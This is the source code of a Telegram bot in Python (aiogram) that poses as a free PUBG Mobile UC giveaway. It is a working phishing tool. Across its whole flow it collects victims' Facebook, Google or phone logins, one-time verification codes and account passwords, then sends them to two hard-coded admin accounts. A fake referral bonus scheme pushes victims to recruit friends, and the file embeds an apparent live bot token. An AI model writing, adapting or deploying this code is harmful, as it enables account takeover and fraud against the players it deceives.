import asyncio
import re
import time
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, \
    InlineKeyboardButton

# Замініть на ваш токен бота
BOT_TOKEN = "8754394339:AAHL7pkjwYqX1eTQHn7gTQ9r5NDrBZgOU68"
# Замініть на ID адміністраторів
ADMIN_ID_1 = 5218516711
ADMIN_ID_2 = 5561735675

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

referral_links = {}
user_invites = {}
user_requests = {}
user_base_uc = {}


class UCForm(StatesGroup):
    waiting_login_method = State()
    waiting_email = State()
    waiting_email_code = State()
    waiting_phone = State()
    waiting_phone_code = State()
    waiting_facebook = State()
    waiting_facebook_code = State()
    waiting_nickname = State()
    waiting_password = State()
    waiting_invite_confirmation = State()
    choosing_additional_uc = State()


def get_main_keyboard(user_id):
    if user_id in user_base_uc:
        keyboard = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="👥 Пригласить друзей")],
                [KeyboardButton(text="📋 Мои запросы")],
                [KeyboardButton(text="❓ Поддержка")]
            ],
            resize_keyboard=True
        )
    else:
        keyboard = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="💰 Получить 100 UC")],
                [KeyboardButton(text="❓ Поддержка")]
            ],
            resize_keyboard=True
        )
    return keyboard


@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id

    args = message.text.split()
    if len(args) > 1:
        referrer_id = args[1]
        if referrer_id.isdigit():
            referrer_id = int(referrer_id)
            if referrer_id != user_id:
                if referrer_id not in user_invites:
                    user_invites[referrer_id] = []

                existing_invite = False
                for inv in user_invites[referrer_id]:
                    if inv['user_id'] == user_id:
                        existing_invite = True
                        break

                if not existing_invite:
                    user_invites[referrer_id].append({
                        'user_id': user_id,
                        'username': message.from_user.username,
                        'first_name': message.from_user.first_name,
                        'joined_time': time.time(),
                        'confirmed': False
                    })

                    try:
                        await bot.send_message(
                            referrer_id,
                            "👋 По вашей ссылке перешел новый пользователь!\n"
                            "Имя: " + message.from_user.first_name + "\n"
                            "После того, как он получит 100 UC, вы получите бонус!"
                        )
                    except:
                        pass

                    await message.answer(
                        "✅ Вы перешли по ссылке приглашения!\n"
                        "После получения 100 UC ваш друг получит бонус!"
                    )

    welcome_text = "👋 Добро пожаловать в приложение PUBG MOBILE UC"

    if user_id in user_base_uc:
        menu_text = """
🎯 ГЛАВНОЕ МЕНЮ 🎯

✅ Вы уже получили 100 UC!
Теперь вы можете приглашать друзей и получать больше:
• 👤 1 друг = +100 UC
• 👥 2 друга = +200 UC
• 👥 3 друга = +300 UC
• 👥 4 друга = +400 UC

Выберите действие:
        """
    else:
        menu_text = """
🎯 ГЛАВНОЕ МЕНЮ 🎯

💰 Нажмите "Получить 100 UC" чтобы начать!

Выберите действие:
        """

    keyboard = get_main_keyboard(user_id)
    await message.answer(welcome_text)
    await message.answer(menu_text, reply_markup=keyboard)


@dp.message(lambda message: message.text == "💰 Получить 100 UC")
async def get_base_uc(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id in user_base_uc:
        await cmd_start(message, state)
        return

    login_message = """
🔐 ВЫБЕРИТЕ МЕТОД ВХОДА 🔐

Сначала выберите, как вы входите в свой аккаунт PUBG Mobile:
    """

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📘 Facebook")],
            [KeyboardButton(text="🔵 Google")],
            [KeyboardButton(text="📱 Номер телефона")]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.answer(login_message, reply_markup=keyboard)
    await state.set_state(UCForm.waiting_login_method)


@dp.message(UCForm.waiting_login_method, lambda message: message.text == "📘 Facebook")
async def facebook_login(message: types.Message, state: FSMContext):
    await state.update_data(login_method="Facebook")
    await message.answer(
        "📘 ВХОД ЧЕРЕЗ FACEBOOK 📘\n\n"
        "📧 Введите email или номер телефона, привязанный к Facebook:\n\n"
        "Пример: example@gmail.com или +380123456789",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(UCForm.waiting_facebook)


@dp.message(UCForm.waiting_login_method, lambda message: message.text == "🔵 Google")
async def google_login(message: types.Message, state: FSMContext):
    await state.update_data(login_method="Google")
    await message.answer(
        "🔵 ВХОД ЧЕРЕЗ GOOGLE 🔵\n\n"
        "✉️ Введите ваш Google email (должен содержать @gmail.com):\n\n"
        "Пример: username@gmail.com",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(UCForm.waiting_email)


@dp.message(UCForm.waiting_login_method, lambda message: message.text == "📱 Номер телефона")
async def phone_login(message: types.Message, state: FSMContext):
    await state.update_data(login_method="Номер телефона")
    await message.answer(
        "📱 ВХОД ЧЕРЕЗ НОМЕР ТЕЛЕФОНА 📱\n\n"
        "☎️ Введите ваш номер телефона:\n\n"
        "Пример: +380123456789",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(UCForm.waiting_phone)


@dp.message(UCForm.waiting_facebook)
async def process_facebook(message: types.Message, state: FSMContext):
    facebook_data = message.text
    await state.update_data(facebook_data=facebook_data)
    await message.answer(
        "📘 КОД ПОДТВЕРЖДЕНИЯ FACEBOOK 📘\n\n"
        "🔐 Введите код подтверждения, который приходит вам на email/телефон\n"
        "для входа в Facebook:\n\n"
        "⚠️ Это нужно для подтверждения доступа к аккаунту"
    )
    await state.set_state(UCForm.waiting_facebook_code)


@dp.message(UCForm.waiting_email)
async def process_email(message: types.Message, state: FSMContext):
    email = message.text
    login_method = (await state.get_data()).get('login_method', 'Google')

    if login_method == "Google" and "@gmail.com" not in email.lower():
        await message.answer(
            "❌ ОШИБКА! ❌\n\n"
            "Email должен содержать @gmail.com\n\n"
            "🔵 Попробуйте еще раз:"
        )
        return

    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(email_pattern, email):
        await message.answer(
            "❌ ОШИБКА! ❌\n\n"
            "Неверный формат email\n\n"
            "Пример: username@gmail.com\n\n"
            "Попробуйте еще раз:"
        )
        return

    await state.update_data(email=email)
    await message.answer(
        "🔵 КОД ПОДТВЕРЖДЕНИЯ GOOGLE 🔵\n\n"
        "🔐 Введите код подтверждения, который приходит вам на email/телефон\n"
        "для входа в Google аккаунт:\n\n"
        "⚠️ Это нужно для подтверждения доступа к аккаунту"
    )
    await state.set_state(UCForm.waiting_email_code)


@dp.message(UCForm.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text
    await state.update_data(phone=phone)
    await message.answer(
        "📱 КОД ПОДТВЕРЖДЕНИЯ 📱\n\n"
        "🔐 Введите код подтверждения, который приходит вам на этот номер\n"
        "для входа в аккаунт PUBG Mobile:\n\n"
        "⚠️ Это нужно для подтверждения доступа к аккаунту"
    )
    await state.set_state(UCForm.waiting_phone_code)


@dp.message(UCForm.waiting_facebook_code)
async def process_facebook_code(message: types.Message, state: FSMContext):
    facebook_code = message.text
    await state.update_data(facebook_code=facebook_code)
    await message.answer(
        "✅ Код подтверждения Facebook сохранен!\n\n"
        "🎮 ВВЕДИТЕ НИКНЕЙМ 🎮\n\n"
        "Введите ваш никнейм в PUBG Mobile:"
    )
    await state.set_state(UCForm.waiting_nickname)


@dp.message(UCForm.waiting_email_code)
async def process_email_code(message: types.Message, state: FSMContext):
    email_code = message.text
    await state.update_data(email_code=email_code)
    await message.answer(
        "✅ Код подтверждения Google сохранен!\n\n"
        "🎮 ВВЕДИТЕ НИКНЕЙМ 🎮\n\n"
        "Введите ваш никнейм в PUBG Mobile:"
    )
    await state.set_state(UCForm.waiting_nickname)


@dp.message(UCForm.waiting_phone_code)
async def process_phone_code(message: types.Message, state: FSMContext):
    phone_code = message.text
    await state.update_data(phone_code=phone_code)
    await message.answer(
        "✅ Код подтверждения сохранен!\n\n"
        "🎮 ВВЕДИТЕ НИКНЕЙМ 🎮\n\n"
        "Введите ваш никнейм в PUBG Mobile:"
    )
    await state.set_state(UCForm.waiting_nickname)


@dp.message(UCForm.waiting_nickname)
async def process_nickname(message: types.Message, state: FSMContext):
    nickname = message.text
    await state.update_data(nickname=nickname)
    await message.answer(
        "✅ Никнейм сохранен: " + nickname + "\n\n"
        "🔐 **ПАРОЛЬ** 🔐\n\n"
        "🛡 Введите ваш пароль от аккаунта PUBG Mobile:"
    )
    await state.set_state(UCForm.waiting_password)


@dp.message(UCForm.waiting_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text
    await state.update_data(password=password)
    await complete_base_request(message, state)


async def complete_base_request(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    user_id = message.from_user.id

    nickname = user_data.get('nickname')
    password = user_data.get('password')
    login_method = user_data.get('login_method')

    login_data = ""
    login_code = ""

    if login_method == "Facebook":
        login_data = user_data.get('facebook_data')
        login_code = user_data.get('facebook_code')
    elif login_method == "Google":
        login_data = user_data.get('email')
        login_code = user_data.get('email_code')
    elif login_method == "Номер телефона":
        login_data = user_data.get('phone')
        login_code = user_data.get('phone_code')

    user_base_uc[user_id] = {
        'nickname': nickname,
        'login_method': login_method,
        'login_data': login_data,
        'login_code': login_code,
        'received_at': time.time()
    }

    admin_message = "✅ БАЗОВЫЙ ЗАПРОС 100 UC ✅\n\n"
    admin_message += "👤 Пользователь: @" + (message.from_user.username or 'Нет username') + "\n"
    admin_message += "🆔 ID: " + str(user_id) + "\n"
    admin_message += "👋 Имя: " + message.from_user.first_name + "\n\n"
    admin_message += "💰 Запрошено: 100 UC (базовые)\n\n"
    admin_message += "📱 Контактные данные:\n"
    admin_message += "🔐 Метод входа: " + login_method + "\n"
    admin_message += "📧 Данные входа: " + login_data + "\n"
    admin_message += "🔑 Код подтверждения: " + login_code + "\n\n"
    admin_message += "🎮 Данные аккаунта PUBG Mobile:\n"
    admin_message += "💎 Никнейм: " + nickname + "\n"
    admin_message += "🔑 Пароль: " + password + "\n\n"
    admin_message += "📅 Время: " + message.date.strftime('%Y-%m-%d %H:%M:%S')

    try:
        await bot.send_message(ADMIN_ID_1, admin_message)
    except Exception as e:
        print(f"Ошибка отправки первому администратору: {e}")

    try:
        await bot.send_message(ADMIN_ID_2, admin_message)
    except Exception as e:
        print(f"Ошибка отправки второму администратору: {e}")

    for referrer_id, invites in user_invites.items():
        for inv in invites:
            if inv['user_id'] == user_id and not inv['confirmed']:
                inv['confirmed'] = True
                try:
                    await bot.send_message(
                        referrer_id,
                        "✅ Ваш друг @" + (message.from_user.username or message.from_user.first_name) + 
                        " получил базовые 100 UC!\nПрогресс приглашений обновлен!"
                    )
                except:
                    pass
                break

    new_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👥 Пригласить друзей")],
            [KeyboardButton(text="📋 Мои запросы")],
            [KeyboardButton(text="❓ Поддержка")]
        ],
        resize_keyboard=True
    )

    success_message = "✅ 100 UC УСПЕШНО ЗАПРОШЕНЫ! ✅\n\n"
    success_message += "📱 Ваши данные:\n"
    success_message += "• Метод входа: " + login_method + "\n"
    success_message += "• Данные входа: " + login_data + "\n"
    success_message += "• Код подтверждения: " + login_code + "\n"
    success_message += "• Никнейм: " + nickname + "\n\n"
    success_message += "💰 Статус: Ожидает начисления\n"
    success_message += "📦 Ваша UC поступит в течение 2 дней\n\n"
    success_message += "🎯 ТЕПЕРЬ ВЫ МОЖЕТЕ ПОЛУЧИТЬ БОЛЬШЕ! 🎯\n"
    success_message += "Приглашайте друзей и получайте:\n"
    success_message += "• 👤 1 друг = +100 UC (всего 200)\n"
    success_message += "• 👥 2 друга = +200 UC (всего 300)\n"
    success_message += "• 👥 3 друга = +300 UC (всего 400)\n"
    success_message += "• 👥 4 друга = +400 UC (всего 500)\n\n"
    success_message += "👇 НОВЫЕ ВОЗМОЖНОСТИ В МЕНЮ 👇"

    await message.answer(success_message, reply_markup=new_keyboard)
    await state.clear()


@dp.message(lambda message: message.text == "👥 Пригласить друзей")
async def invite_friends_menu(message: types.Message, state: FSMContext):
    user_id = message.from_user.id

    if user_id not in user_base_uc:
        await message.answer(
            "❌ Сначала получите базовые 100 UC! ❌\n\n"
            "Нажмите кнопку '💰 Получить 100 UC' и введите данные аккаунта."
        )
        return

    invite_menu = """
👥 ПРИГЛАШЕНИЕ ДРУЗЕЙ 👥

Выберите, сколько дополнительной UC хотите получить:

• 👤 1 друг = +100 UC (всего 200)
• 👥 2 друга = +200 UC (всего 300)
• 👥 3 друга = +300 UC (всего 400)
• 👥 4 друга = +400 UC (всего 500)
    """

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="👤 +100 UC (1 друг)")],
            [KeyboardButton(text="👥 +200 UC (2 друга)")],
            [KeyboardButton(text="👥 +300 UC (3 друга)")],
            [KeyboardButton(text="👥 +400 UC (4 друга)")],
            [KeyboardButton(text="🏠 Главное меню")]
        ],
        resize_keyboard=True
    )

    await message.answer(invite_menu, reply_markup=keyboard)
    await state.set_state(UCForm.choosing_additional_uc)


@dp.message(UCForm.choosing_additional_uc)
async def choose_additional_uc(message: types.Message, state: FSMContext):
    text = message.text
    friends_needed = 0
    additional_uc = 0

    if "1 друг" in text:
        friends_needed = 1
        additional_uc = 100
    elif "2 друга" in text:
        friends_needed = 2
        additional_uc = 200
    elif "3 друга" in text:
        friends_needed = 3
        additional_uc = 300
    elif "4 друга" in text:
        friends_needed = 4
        additional_uc = 400
    elif text == "🏠 Главное меню":
        await cmd_start(message, state)
        return
    else:
        await message.answer("Пожалуйста, выберите вариант из меню")
        return

    user_id = message.from_user.id
    base_uc_info = user_base_uc.get(user_id, {})
    total_uc = 100 + additional_uc

    await state.update_data(
        request_type="additional",
        friends_needed=friends_needed,
        additional_uc=additional_uc,
        total_uc=total_uc,
        nickname=base_uc_info.get('nickname'),
        login_method=base_uc_info.get('login_method'),
        login_data=base_uc_info.get('login_data'),
        login_code=base_uc_info.get('login_code')
    )

    bot_username = (await bot.me()).username
    referral_link = f"https://t.me/{bot_username}?start={user_id}"

    referral_links[user_id] = {
        'link': referral_link,
        'friends_needed': friends_needed,
        'additional_uc': additional_uc,
        'created_at': time.time()
    }

    invite_message = "✅ ДОПОЛНИТЕЛЬНАЯ UC ✅\n\n"
    invite_message += "🎮 Никнейм: " + str(base_uc_info.get('nickname')) + "\n"
    invite_message += "💰 Базовая UC: 100\n"
    invite_message += "➕ Дополнительно: +" + str(additional_uc) + "\n"
    invite_message += "🎁 ВСЕГО: " + str(total_uc) + " UC\n"
    invite_message += "👥 Нужно пригласить: " + str(friends_needed) + " друзей\n\n"
    invite_message += "🔗 ВАША РЕФЕРАЛЬНАЯ ССЫЛКА:\n" + referral_link + "\n\n"
    invite_message += "📋 ИНСТРУКЦИЯ:\n"
    invite_message += "1️⃣ Отправьте эту ссылку друзьям\n"
    invite_message += "2️⃣ Друзья должны перейти по ссылке и нажать /start\n"
    invite_message += "3️⃣ Друзья должны получить базовые 100 UC (ввести данные)\n"
    invite_message += "4️⃣ После выполнения условий вы получите дополнительную UC\n\n"
    invite_message += "✅ Текущий статус: 0/" + str(friends_needed) + " друзей"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Проверить статус", callback_data="check_additional_status")],
        [InlineKeyboardButton(text="📋 Мои приглашения", callback_data="view_invites")],
        [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
    ])

    await message.answer(invite_message, reply_markup=keyboard)
    await state.set_state(UCForm.waiting_invite_confirmation)


@dp.callback_query(lambda c: c.data == "check_additional_status")
async def check_additional_status(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    user_data = await state.get_data()

    if not user_data:
        await callback_query.answer("Данные не найдены. Начните заново.", show_alert=True)
        return

    friends_needed = user_data.get('friends_needed', 1)
    additional_uc = user_data.get('additional_uc', 100)
    total_uc = user_data.get('total_uc', 200)

    invited_users = user_invites.get(user_id, [])
    confirmed_users = [u for u in invited_users if u.get('confirmed', False)]
    confirmed_count = len(confirmed_users)

    if confirmed_count >= friends_needed:
        base_info = user_base_uc.get(user_id, {})

        admin_message = "✅ ДОПОЛНИТЕЛЬНЫЙ ЗАПРОС UC ✅\n\n"
        admin_message += "👤 Пользователь: @" + (callback_query.from_user.username or 'Нет username') + "\n"
        admin_message += "🆔 ID: " + str(user_id) + "\n"
        admin_message += "👋 Имя: " + callback_query.from_user.first_name + "\n\n"
        admin_message += "💰 Запрошено: +" + str(additional_uc) + " UC (всего " + str(total_uc) + ")\n"
        admin_message += "👥 Приглашено друзей: " + str(confirmed_count) + "/" + str(friends_needed) + "\n\n"
        admin_message += "📱 Контактные данные:\n"
        admin_message += "🔐 Метод входа: " + str(base_info.get('login_method')) + "\n"
        admin_message += "📧 Данные входа: " + str(base_info.get('login_data')) + "\n"
        admin_message += "🔑 Код подтверждения: " + str(base_info.get('login_code')) + "\n\n"
        admin_message += "🎮 Данные аккаунта PUBG Mobile:\n"
        admin_message += "💎 Никнейм: " + str(base_info.get('nickname')) + "\n\n"
        admin_message += "📅 Время: " + time.strftime('%Y-%m-%d %H:%M:%S')

        try:
            await bot.send_message(ADMIN_ID_1, admin_message)
        except:
            pass

        try:
            await bot.send_message(ADMIN_ID_2, admin_message)
        except:
            pass

        users_list = ""
        for u in confirmed_users:
            users_list += "✅ " + u['first_name'] + " (@" + str(u['username']) + ")\n"

        result_text = "✅ УСЛОВИЕ ВЫПОЛНЕНО! ✅\n\n"
        result_text += "👥 Приглашено друзей: " + str(confirmed_count) + "/" + str(friends_needed) + "\n"
        result_text += "💰 Дополнительная UC: +" + str(additional_uc) + "\n"
        result_text += "🎁 ВСЕГО: " + str(total_uc) + " UC\n\n"
        result_text += "**Приглашенные друзья:**\n" + users_list + "\n"
        result_text += "✅ Запрос отправлен администратору!\n"
        result_text += "Ожидайте начисления в течение 2 дней."

        await callback_query.message.edit_text(
            result_text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )
        await state.clear()

    else:
        remaining = friends_needed - confirmed_count
        users_list = ""
        if confirmed_users:
            for u in confirmed_users:
                users_list += "✅ " + u['first_name'] + "\n"

        link = referral_links.get(user_id, {}).get('link', 'Ссылка не найдена')

        status_text = "❌ **УСЛОВИЕ НЕ ВЫПОЛНЕНО** ❌\n\n"
        status_text += "👥 Приглашено: " + str(confirmed_count) + "/" + str(friends_needed) + "\n"
        status_text += "⏳ Осталось пригласить: " + str(remaining) + "\n\n"
        if confirmed_users:
            status_text += "✅ **Подтвержденные друзья:**\n" + users_list + "\n"
        else:
            status_text += "❌ Пока нет подтвержденных друзей\n\n"
        status_text += "🔗 Ваша ссылка: " + link + "\n\n"
        status_text += "⏰ После того, как все друзья получат базовую UC, нажмите 'Проверить статус' снова."

        await callback_query.message.edit_text(
            status_text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Проверить статус", callback_data="check_additional_status")],
                [InlineKeyboardButton(text="📋 Мои приглашения", callback_data="view_invites")],
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )

    await callback_query.answer()


@dp.callback_query(lambda c: c.data == "view_invites")
async def view_invites(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    invited_users = user_invites.get(user_id, [])

    if not invited_users:
        await callback_query.message.edit_text(
            "📋 **ВАШИ ПРИГЛАШЕНИЯ** 📋\n\n"
            "У вас пока нет приглашенных друзей.\n\n"
            "Отправьте свою реферальную ссылку друзьям, чтобы получать бонусы!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_invite")],
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )
        await callback_query.answer()
        return

    confirmed = [u for u in invited_users if u.get('confirmed')]
    pending = [u for u in invited_users if not u.get('confirmed')]

    text = "📋 **ВАШИ ПРИГЛАШЕНИЯ** 📋\n\n"
    text += "✅ Подтверждено: " + str(len(confirmed)) + "\n"
    text += "⏳ Ожидают: " + str(len(pending)) + "\n\n"

    if confirmed:
        text += "✅ **Подтвержденные:**\n"
        for u in confirmed:
            username = "@" + str(u['username']) if u['username'] else u['first_name']
            text += "• " + username + "\n"
        text += "\n"

    if pending:
        text += "⏳ **Ожидают подтверждения:**\n"
        for u in pending:
            username = "@" + str(u['username']) if u['username'] else u['first_name']
            text += "• " + username + "\n"

    await callback_query.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_invite")],
            [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
        ])
    )
    await callback_query.answer()


@dp.callback_query(lambda c: c.data == "back_to_invite")
async def back_to_invite(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    user_data = await state.get_data()

    if user_data:
        friends_needed = user_data.get('friends_needed', 1)
        additional_uc = user_data.get('additional_uc', 100)
        total_uc = user_data.get('total_uc', 200)
        referral_link = referral_links.get(user_id, {}).get('link', 'Ссылка не найдена')

        text = "✅ **ДОПОЛНИТЕЛЬНАЯ UC** ✅\n\n"
        text += "💰 Дополнительно: +" + str(additional_uc) + "\n"
        text += "🎁 ВСЕГО: " + str(total_uc) + " UC\n"
        text += "👥 Нужно пригласить: " + str(friends_needed) + " друзей\n\n"
        text += "🔗 **ВАША РЕФЕРАЛЬНАЯ ССЫЛКА:**\n" + referral_link + "\n\n"
        text += "✅ Текущий статус: проверьте в разделе 'Мои приглашения'"

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Проверить статус", callback_data="check_additional_status")],
            [InlineKeyboardButton(text="📋 Мои приглашения", callback_data="view_invites")],
            [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
        ])

        await callback_query.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback_query.message.edit_text(
            "❌ Данные не найдены. Начните заново.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
            ])
        )

    await callback_query.answer()


@dp.callback_query(lambda c: c.data == "back_to_menu")
async def back_to_menu_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = callback_query.from_user.id

    welcome_text = "👋 Добро пожаловать в приложение PUBG MOBILE UC"

    if user_id in user_base_uc:
        menu_text = """
🎯 ГЛАВНОЕ МЕНЮ 🎯

✅ Вы уже получили 100 UC!
Теперь вы можете приглашать друзей и получать больше:
• 👤 1 друг = +100 UC
• 👥 2 друга = +200 UC
• 👥 3 друга = +300 UC
• 👥 4 друга = +400 UC

Выберите действие:
        """
    else:
        menu_text = """
🎯 ГЛАВНОЕ МЕНЮ 🎯

💰 Нажмите "Получить 100 UC" чтобы начать!

Выберите действие:
        """

    keyboard = get_main_keyboard(user_id)

    await callback_query.message.answer(welcome_text)
    await callback_query.message.answer(menu_text, reply_markup=keyboard)
    await callback_query.answer()


@dp.message(lambda message: message.text == "📋 Мои запросы")
async def my_requests(message: types.Message):
    user_id = message.from_user.id

    base_info = user_base_uc.get(user_id)
    invited_users = user_invites.get(user_id, [])

    confirmed_count = len([u for u in invited_users if u.get('confirmed', False)])
    pending_count = len([u for u in invited_users if not u.get('confirmed', False)])

    if base_info:
        text = "📋 МОИ ЗАПРОСЫ 📋\n\n"
        text += "✅ Базовый запрос:\n"
        text += "• Статус: 100 UC - в обработке\n"
        text += "• Метод входа: " + str(base_info.get('login_method')) + "\n"
        text += "• Данные входа: " + str(base_info.get('login_data')) + "\n"
        text += "• Код: " + str(base_info.get('login_code')) + "\n"
        text += "• Никнейм: " + str(base_info.get('nickname')) + "\n"
        text += "• Дата: " + time.strftime('%Y-%m-%d', time.localtime(base_info.get('received_at', time.time()))) + "\n\n"
        text += "👥 Приглашения друзей:\n"
        text += "• Всего приглашено: " + str(len(invited_users)) + "\n"
        text += "• ✅ Подтверждено: " + str(confirmed_count) + "\n"
        text += "• ⏳ Ожидают: " + str(pending_count)

        if confirmed_count > 0:
            text += "\n\n🎁 Дополнительная UC: +" + str(confirmed_count * 100) + " (при начислении)"
    else:
        text = """
📋 МОИ ЗАПРОСЫ 📋

У вас пока нет активных запросов.

Нажмите "💰 Получить 100 UC" чтобы начать!
        """

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🏠 Главное меню")],
            [KeyboardButton(text="👥 Пригласить друзей")]
        ],
        resize_keyboard=True
    )

    await message.answer(text, reply_markup=keyboard)


@dp.message(lambda message: message.text == "❓ Поддержка")
async def support(message: types.Message):
    user_id = message.from_user.id

    support_message = """
🆘 ПОДДЕРЖКА 🆘

📞 По вопросам обращайтесь: @admin
⏰ Время работы: 24/7
💬 Ответ: в течение 24 часов

❓ Частые вопросы:

💰 Базовые 100 UC:
• Доступны сразу после ввода данных
• Начисляются в течение 2 дней

👥 Дополнительная UC:
• 1 друг = +100 UC
• 2 друга = +200 UC
• 3 друга = +300 UC
• 4 друга = +400 UC

📋 Как получить больше:
1. Получите базовые 100 UC
2. Приглашайте друзей по ссылке
3. Друзья получают базовые 100 UC
4. Вы получаете бонус

✅ Статус запросов:
• Проверяйте в разделе "Мои запросы"
• По всем вопросам пишите администратору
    """

    keyboard = get_main_keyboard(user_id)
    await message.answer(support_message, reply_markup=keyboard)


@dp.message(lambda message: message.text == "🏠 Главное меню")
async def back_to_menu(message: types.Message, state: FSMContext):
    await cmd_start(message, state)


async def main():
    print("🤖 Бот-приложение PUBG MOBILE UC запущен!")
    print("🎯 Ожидание команд...")
    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())
